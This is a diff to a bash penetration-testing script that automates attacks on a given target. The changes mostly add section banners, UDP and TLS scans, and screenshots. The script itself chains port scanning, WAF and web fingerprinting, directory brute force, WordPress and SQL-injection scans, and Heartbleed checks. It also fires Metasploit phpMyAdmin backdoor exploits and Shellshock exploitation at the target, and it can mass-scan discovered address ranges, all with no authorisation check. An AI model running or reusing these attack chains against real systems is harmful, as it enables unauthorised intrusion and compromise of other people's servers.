@@ -112,6 +112,17 @@ if [ "$TARGET" = "loot" ]; then
 	exit
 fi
 
+if [ "$MODE" = "discover" ]; then
+	sniper
+	unicornscan $TARGET -p 21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1524,2049,2121,3306,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152 | awk '{print $6}' | sort -u > $PWD/loot/sniper-ips.txt
+	if [ "$OPT1" = "report" ]; then
+		./sniper $PWD/loot/sniper-ips.txt airstrike | tee ./loot/sniper-discover-`date +%Y%m%d%H%M`.txt 2>&1
+		exit
+	fi	
+	sniper $PWD/loot/sniper-ips.txt airstrike
+	exit
+fi
+
 if [ "$MODE" = "web" ]; then
 	if [ "$OPT1" = "report" ]; then
 		./sniper $TARGET $MODE | tee ./loot/sniper-$TARGET-$MODE-`date +%Y%m%d%H%M`.txt 2>&1
@@ -183,13 +194,23 @@ if [ "$MODE" = "stealth" ]; then
 		python Sublist3r/sublist3r.py -d $TARGET -vvv 2>/dev/null
 	fi
 	echo ""
-	echo -e "$OKGREEN################################### Running active scans #########################$RESET"
+	echo -e "$OKGREEN################################### Running TCP port scan #########################$RESET"
 	unicornscan $TARGET:21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1524,2049,2121,3306,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152 2> /dev/null
+	echo -e "$OKGREEN################################### Running UDP port scan #########################$RESET"
+	unicornscan -mU $TARGET:53,67,68,88,161,162,137,138,139,389,520,2049 2> /dev/null
+	echo -e "$OKGREEN################################### Checking for WAF ##############################$RESET"
 	wafw00f http://$TARGET
+	echo -e "$OKGREEN################################### Gathering HTTP Info ###########################$RESET"
 	whatweb http://$TARGET
 	xsstracer $TARGET 80
+	echo -e "$OKGREEN################################### Gathering SSL/TLS Info ########################$RESET"
 	sslscan --no-failed $TARGET
+	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
+	echo -e "$OKGREEN################################### Saving Web Screenshots ########################$RESET"
 	cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg
+	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port80.jpg"
+	cutycapt --url=https://$TARGET --out=loot/$TARGET-port443.jpg
+	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port443.jpg"
 	echo -e "$OKGREEN################################### Done! #########################################$RESET"
 	exit
 fi
@@ -257,15 +278,25 @@ if [ "$MODE" = "airstrike" ]; then
 			python Sublist3r/sublist3r.py -d $a -vvv 2>/dev/null
 		fi
 		echo ""
-		echo -e "$OKGREEN################################### Running active scans #########################$RESET"
+		echo -e "$OKGREEN################################### Running TCP port scan #########################$RESET"
 		unicornscan $a:21,22,23,25,53,79,80,110,111,135,139,162,389,443,445,512,513,514,1099,1524,2049,2121,3306,3389,3632,5432,5800,5900,6667,8000,8009,8080,8180,8443,8888,10000,49152 2> /dev/null
-		xprobe2 $a
+		echo -e "$OKGREEN################################### Running UDP port scan #########################$RESET"
+		unicornscan -mU $a:53,67,68,88,161,162,137,138,139,389,520,2049 2> /dev/null
+		echo -e "$OKGREEN################################### Checking for WAF ##############################$RESET"
 		wafw00f http://$a
+		echo -e "$OKGREEN################################### Gathering HTTP Info ###########################$RESET"
 		whatweb http://$a
 		xsstracer $a 80
+		echo -e "$OKGREEN################################### Gathering SSL/TLS Info ########################$RESET"
 		sslscan --no-failed $a
+		sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $a
+		echo -e "$OKGREEN################################### Saving Web Screenshots ########################$RESET"
 		cutycapt --url=http://$a --out=loot/$a-port80.jpg
+		echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port80.jpg"
+		cutycapt --url=https://$a --out=loot/$a-port443.jpg
+		echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port443.jpg"
 		echo -e "$OKGREEN################################### Done! #########################################$RESET"
+		exit
 		echo -e ""
 		echo -e ""
 		echo -e ""
@@ -476,12 +507,14 @@ then
 	echo -e "$OKRED+ -- --=[Port 80 closed... skipping.$RESET"
 else
 	echo -e "$OKGREEN+ -- --=[Port 80 opened... running tests...$RESET"
+	echo -e "$OKGREEN################################### Checking for WAF ##############################$RESET"
 	wafw00f http://$TARGET
 	echo ""
+	echo -e "$OKGREEN################################### Gathering HTTP Info ###########################$RESET"
 	whatweb http://$TARGET
 	xsstracer $TARGET 80
-	
 	echo ""
+	echo -e "$OKGREEN################################### Checking HTTP Headers #########################$RESET"
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I http://$TARGET | egrep -i 'X-Content' | tail -n 10
 	echo ""
@@ -529,31 +562,43 @@ else
 	curl -s --insecure http://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
 	echo ""
 	echo -e "$RESET"
-
+	echo -e "$OKGREEN################################### Running Web Vulnerability Scan ################$RESET"
 	nikto -h http://$TARGET 
+	echo -e "$OKGREEN################################### Saving Web Screenshots ########################$RESET"
+	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port80.jpg"
 	cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg
 	
 	if [ "$MODE" = "web" ]
 	then
+		echo -e "$OKGREEN################################### Running NMap HTTP Scripts ##################$RESET"
 		nmap -sV -T5 -p 80 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal
+		echo -e "$OKGREEN################################### Running Directory Brute Force ##############$RESET"
 		dirb http://$TARGET
+		echo -e "$OKGREEN################################### Running Wordpress Vulnerability Scans ######$RESET"
 		wpscan --url http://$TARGET --batch
 		echo ""
 		wpscan --url http://$TARGET/wordpress/ --batch
 		echo ""
+		echo -e "$OKGREEN################################### Running CMSMap #############################$RESET"
 		python $CMSMAP -t http://$TARGET
 		echo ""
 		python $CMSMAP -t http://$TARGET/wordpress/
 		echo ""
+		echo -e "$OKGREEN################################### Running Uniscan Web Vulnerability Scan #####$RESET"
 		uniscan -u http://$TARGET -qweds
+		echo -e "$OKGREEN################################### Running SQLMap SQL Injection Scan ##########$RESET"
 		sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
+		echo -e "$OKGREEN################################### Running PHPMyAdmin Metasploit Exploit ######$RESET"
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+		echo -e "$OKGREEN################################### Running ShellShock Auto-Scan Exploit #######$RESET"
 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 80
 	fi
 	
 	if [ $SCAN_TYPE == "DOMAIN" ];
 	then
+		echo -e "$OKGREEN################################### Running Google Hacking Queries #############$RESET"
 		goohak $TARGET > /dev/null
+		echo -e "$OKGREEN################################### Running InUrlBR OSINT Queries ##############$RESET"
 		php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
 		rm -Rf output/ cookie.txt exploits.conf
 		GHDB="1"
@@ -593,6 +638,7 @@ then
 else
 	echo -e "$OKGREEN+ -- --=[Port 139 opened... running tests...$RESET"
 	SMB="1"
+	echo -e "$OKGREEN################################### Running SMB Enumeration ####################$RESET"
 	enum4linux $TARGET
 	python $SAMRDUMP $TARGET
 	nbtscan $TARGET
@@ -622,16 +668,20 @@ then
 	echo -e "$OKRED+ -- --=[Port 443 closed... skipping.$RESET"
 else
 	echo -e "$OKGREEN+ -- --=[Port 443 opened... running tests...$RESET"
+	echo -e "$OKGREEN################################### Checking for WAF ##############################$RESET"
 	wafw00f https://$TARGET
 	echo ""
+	echo -e "$OKGREEN################################### Gathering HTTP Info ###########################$RESET"
 	whatweb https://$TARGET
 	echo ""
+	echo -e "$OKGREEN################################### Gathering SSL/TLS Info ########################$RESET"
 	sslscan --no-failed $TARGET 
+	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
 	echo ""
 	cd MassBleed
 	./massbleed $TARGET port 443
 	cd ..
-	
+	echo -e "$OKGREEN################################### Checking HTTP Headers #########################$RESET"
 	echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
 	curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
 	echo ""
@@ -679,24 +729,34 @@ else
 	curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
 	echo ""
 	echo -e "$RESET"
-	
+	echo -e "$OKGREEN################################### Running Web Vulnerability Scan ################$RESET"
 	nikto -h https://$TARGET 
+	echo -e "$OKGREEN################################### Saving Web Screenshots ########################$RESET"
 	cutycapt --url=https://$TARGET --out=loot/$TARGET-port443.jpg
+	echo -e "$OKRED[+]$RESET Screenshot saved to $PWD/loot/$TARGET-port443.jpg"
 	
 	if [ "$MODE" = "web" ]
 	then
+		echo -e "$OKGREEN################################### Running NMap HTTP Scripts ##################$RESET"
 		nmap -sV -T5 -p 443 --script=http-enum,http-headers,http-server-header,http-php-version,http-iis-webdav-vuln,http-vuln-*,http-phpmyadmin-dir-traversal
+		echo -e "$OKGREEN################################### Running Directory Brute Force ##############$RESET"
 		dirb https://$TARGET
+		echo -e "$OKGREEN################################### Running Wordpress Vulnerability Scans ######$RESET"
 		wpscan --url https://$TARGET --batch
 		echo ""
 		wpscan --url https://$TARGET/wordpress/ --batch
+		echo -e "$OKGREEN################################### Running CMSMap #############################$RESET"
 		python $CMSMAP -t https://$TARGET
 		echo ""
 		python $CMSMAP -t https://$TARGET/wordpress/
 		echo ""
+		echo -e "$OKGREEN################################### Running Uniscan Web Vulnerability Scan #####$RESET"
 		uniscan -u https://$TARGET -qweds
+		echo -e "$OKGREEN################################### Running SQLMap SQL Injection Scan ##########$RESET"
 		sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
+		echo -e "$OKGREEN################################### Running PHPMyAdmin Metasploit Exploit ######$RESET"
 		msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
+		echo -e "$OKGREEN################################### Running ShellShock Auto-Scan Exploit #######$RESET"
 		python shocker/shocker.py -H $TARGET --cgilist shocker/shocker-cgi_list --port 443 --ssl
 	fi
 	
@@ -704,7 +764,9 @@ else
 	then
 		if [ -z $GHDB ]
 		then
+			echo -e "$OKGREEN################################### Running Google Hacking Queries #############$RESET"
 			goohak $TARGET > /dev/null
+			echo -e "$OKGREEN################################### Running InUrlBR OSINT Queries ##############$RESET"
 			php $INURLBR --dork "site:$TARGET" -s $LOOT_DIR/inurlbr-$TARGET.txt
 			rm -Rf output/ cookie.txt exploits.conf
 		fi
@@ -856,9 +918,6 @@ else
 	whatweb http://$TARGET:8000
 	echo ""
 	xsstracer $TARGET 8000
-	sslscan --no-failed $TARGET:8000
-	cd MassBleed
-	./massbleed $TARGET port 8000
 	cd ..
 	nikto -h http://$TARGET:8000 
 	cutycapt --url=http://$TARGET:8000 --out=loot/$TARGET-port8000.jpg
@@ -917,6 +976,7 @@ else
 	echo ""
 	xsstracer $TARGET 8180
 	sslscan --no-failed $TARGET:8180
+	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8180
 	cd MassBleed
 	./massbleed $TARGET port 8180
 	cd ..
@@ -937,6 +997,7 @@ else
 	echo ""
 	xsstracer $TARGET 8443
 	sslscan --no-failed $TARGET:8443
+	sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET:8443
 	cd MassBleed
 	./massbleed $TARGET port 8443
 	cd ..
